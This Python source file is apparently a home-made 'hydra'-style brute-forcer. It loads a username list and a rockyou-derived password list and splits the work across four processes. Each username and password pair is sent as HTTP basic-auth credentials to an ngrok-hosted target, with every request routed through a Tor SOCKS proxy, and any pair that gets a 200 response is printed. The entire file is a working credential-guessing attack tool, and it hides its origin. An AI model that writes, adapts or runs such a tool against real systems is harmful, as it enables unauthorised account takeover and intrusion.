from multiprocessing import Process, Event
import requests, os

f = open("/home/kaisok/Documentos/Python/KsKhydra/top-usernames-shortlist.txt", "r",encoding="latin-1")
h = open("/home/kaisok/Documentos/Python/KsKhydra/rockyou_malo", "r",encoding="latin-1")
user = f.readlines()
f.close()
passwd = h.readlines()
h.close()

def hydra(users,e):
    for usr in users:
        for y in passwd:
            if e.is_set():
                exit()
            y = y.strip("\n")
            usr = usr.strip("\n")
            if y.isalpha():

                print("Testing: {}:{}".format(usr, y), end="\r")

                try:
                    proxies = {"http": "socks5://127.0.0.1:9050"}
                    req = requests.get("http://{}:{}@be06-81-40-160-123.ngrok.io".format(str(usr), str(y)),proxies=proxies)

                    if req.status_code == 200:

                        print("#"*40, end="\r\n")
                        print("User: {}\nPassword: {}".format(usr, y), end="\n")
                        print("#"*40, end="\r\n")
                        e.set()

                except KeyboardInterrupt():

                    exit()

                except Exception as e:
                    print(e)

                    pass
            else:
                continue

e = Event()
if __name__ == "__main__":

    procs = []
    for i in range(4):
        proc = Process(target=hydra, args=(user[i::4],e))
        procs.append(proc)
        #print(user)
    for proc in procs:
        proc.start()


